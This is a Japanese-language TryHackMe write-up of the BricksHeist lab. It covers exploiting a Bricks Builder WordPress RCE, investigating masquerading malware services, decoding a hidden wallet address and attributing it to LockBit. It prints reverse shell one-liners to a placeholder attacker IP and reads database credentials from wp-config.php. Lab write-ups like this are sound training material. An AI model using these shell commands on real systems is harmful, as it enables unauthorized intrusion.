# 🛡️ TryHackMe – BricksHeist - Writeup

## 📌 Overview
**Room Name:** BricksHeist  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** WordPress / RCE / フォレンジクス / 暗号資産調査

BricksHeistは、WordPressプラグインの既知CVEを起点として初期侵入し、マルウェアに感染したシステムを内部調査するLinuxマシンです。不審なサービスの特定から始まり、隠されたエンコード済みウォレットアドレスを復号し、攻撃者グループをOSINTで特定するまでの一連のフォレンジクス調査が要求されます。

攻撃チェーンの概要：

- rustscanによるポートスキャンとWordPress/Bricks Builderバージョン特定
- CVE-2024-25600（Bricks Builder RCE）によるWebShell取得
- PHPのeval()制約を回避したリバースシェルの安定化
- 不審なsystemdサービス（マスカレーディング）の特定
- WebSockify経由のVNCブリッジ構造の把握
- wp-config.phpからのDB認証情報取得とMySQL調査
- inet.confの3重エンコード（Hex → Base64 → Base64）を復号してウォレットアドレス発見
- chainabuse.comによるLockBitランサムウェアグループへの帰属特定

---

## 🔍 1. Enumeration

### 🔎 ポートスキャン
`rustscan` による初期スキャンで以下のポートが発見された：

```bash
rustscan -a <TARGET_IP>
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  WebSockify
443/tcp  open  https (WordPress)
3306/tcp open  mysql
```

ポート80はHTTPではなく **WebSockify**（WebSocket→TCPブリッジ）が動作している点に注目。

### 🌐 WordPress調査
ポート443のWordPressサイトにアクセスし、HTMLソースを分析した：

- Bricks Builderテーマが使用されていることを確認
- ページ内に **nonce値** が露出していることを発見

`wpscan` でバージョンを特定した：

```bash
wpscan --url https://<TARGET_IP> --disable-tls-checks
```

**発見：** `Bricks Builder 1.9.5`

---

## 🔓 2. Initial Access

### 💀 CVE-2024-25600（Bricks Builder RCE）
Bricks Builder 1.9.5には認証不要のRCE脆弱性が存在する。HTMLソースから取得したnonceを使用してexploitを実行した：

```bash
python3 exploit.py --url https://<TARGET_IP> --nonce <nonce_value>
```

`Shell>` プロンプトが得られ、任意のコマンド実行が可能になった。

### 🔧 シェルの安定化
`Shell>` から通常のリバースシェルを試みたが失敗した：

```bash
# 失敗例（bash直接）
bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
# → タイムアウト

# 失敗例（Python3）
python3 -c 'import socket...'
# → 同様に失敗
```

> **失敗の原因：** `Shell>` はPHPの `eval()` 経由でHTTPリクエストのレスポンスを待つ構造のため、フォアグラウンドで接続を張るコマンドはブロッキングになりタイムアウトする。

`exec` を使いプロセスを置き換える形式で成功した：

```bash
bash -c 'exec bash -i &>/dev/tcp/<KALI_IP>/4444 0>&1'
```

```bash
whoami
# apache
```

**`apache` ユーザーとして初期侵入に成功。** ✅

---

## 🚀 3. 内部調査：不審なサービスの特定

### 🔍 実行中サービスの調査

```bash
systemctl | grep running
```

一見普通に見えるサービスの中に不審なものが混在していた：

| サービス名 | 判定 | 理由 |
|-----------|------|------|
| `getty@tty1.service` | 正常 | 標準のターミナル管理サービス |
| `ubuntu.service` | **不審** ✅ | 説明文に `TRYHACK3M` が含まれる |
| `badr.service` | **不審** ✅ | 起動10秒後に自分自身を削除する証拠隠滅の挙動 |
| `nm-inet-dialog` | **不審** ✅ | 正規の `NetworkManager` に名前を似せたマスカレーディング |

> **怪しいサービスの見分け方：**
> - 名前が一般的でない
> - 正規のサービス名に似せている（マスカレーディング）
> - 説明文や実行ファイルパスが標準と異なる

### 🌐 ネットワーク構造の把握

```bash
ss -tulnp
```

ポート **5901（VNC）** が内部でリッスンしていることが判明した：

```text
127.0.0.1:5901   LISTEN   (VNC server)
0.0.0.0:80       LISTEN   (WebSockify)
```

> **構造の理解：** ポート80のWebSockifyは、外部からのWebSocket接続を内部のVNC（5901）にブリッジしている。直接TCPでVNCにアクセスすることはできない。

---

## 🚀 4. DB調査とパスワード探索

### 🔑 wp-config.phpからの認証情報取得

```bash
cat /var/www/html/wp-config.php
```

DBパスワードとして `lamp.sh` を発見した。

```bash
# 試みたが失敗
su - root
# → 失敗

# 失敗の原因：wp-config.phpのパスワードはMySQL用であり、
# システムログインパスワードとは別物
```

KaliからのMySQL接続もホストベースアクセス制御により拒否された。`Shell>` から非対話的にSQLを実行することで解決した：

```bash
mysql -u <user> -p<password> -e "SHOW DATABASES;" <dbname>
```

---

## 🚀 5. VNC接続の試み

```bash
# 直接接続を試みたが失敗
vncviewer <TARGET_IP>:5901
# → 失敗

# 失敗の原因：vncviewerは直接TCPで接続するが、
# ポート80はWebSocketプロトコルのため非互換
```

noVNCを使用してWebSocket経由での接続を試みたが、今回は接続未解決のまま別の経路でフラグを取得した。

---

## 👑 6. ウォレットアドレスの発見と攻撃者特定

### 🔍 inet.confの発見
システム上の設定ファイルを調査した際、`inet.conf` 内に不自然な長いHex文字列が埋め込まれているのを発見した。

### 🔓 3重エンコードのデコード
Hex文字列を段階的に復号した：

```bash
# Step 1: Hex → ASCII
echo "<hex_string>" | xxd -r -p

# Step 2: Base64デコード（1回目）
echo "<base64_string>" | base64 -d

# Step 3: Base64デコード（2回目）
echo "<base64_string_2>" | base64 -d
```

> **注意点：** デコード結果は2つのウォレットアドレスが連結された形式になっており、適切な位置で分割する必要があった。

### 🌐 OSINT調査
取得したウォレットアドレスをブロックチェーンエクスプローラーで調査した：

```
blockchain.com → 取引履歴の確認
chainabuse.com → 不正報告との照合
```

**結果：** `chainabuse.com` 上の報告から、このウォレットアドレスが **LockBitランサムウェアグループ** に帰属することが特定された。

---

## 📚 Key Takeaways

- 🔍 **既知CVEを先に確認する癖をつける：** XSSやSQLiを試す前に、使用中のCMSやプラグインのバージョンを特定し、既知のCVEをまず調べる。HTMLソースを読めばBricks Builderのバージョンは明らかだった。

- 🐚 **PHPのeval()経由Shellの制約を理解する：** `Shell>` のような環境ではHTTPリクエスト/レスポンスのサイクルがブロッキングになる。`exec` でプロセスを置き換える形式のコマンドが有効。

- 🔑 **wp-config.phpのパスワード ≠ システムパスワード：** DBパスワードはMySQL専用。rootへの昇格に直接使おうとするのは間違い。

- 🕵️ **マスカレーディングサービスの見分け方：** 正規サービスに名前を似せた不審なサービスは、説明文・実行ファイルパス・起動挙動で判別できる。`badr.service` のように起動後に自己削除するものはフォレンジクス調査で特に注意が必要。

- 🌐 **WebSockify ≠ 直接TCP：** WebSocket越しのVNCに直接TCPクライアント（vncviewer）で接続はできない。WebSocketに対応したクライアント（noVNC等）が必要。

- 🔓 **多重エンコードによるデータ隠蔽：** Hex + Base64 × 2 のような重ねがけは、各ステップを丁寧に分解すれば必ず解ける。デコード結果に複数のデータが連結されていないか確認する。

- 🌍 **OSINTによる攻撃者帰属：** ウォレットアドレスはblockchain.comで取引履歴を、chainabuse.comで不正報告を確認することで攻撃グループの特定につながる。

---

## 🛠️ Tools Used

- `rustscan`
- `wpscan`
- `curl`
- `python3` (exploit, PTY安定化)
- `nc` (netcat)
- `systemctl`, `ss`
- `mysql`
- `xxd`, `base64`
- `strings`
- blockchain.com, chainabuse.com（OSINT）

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
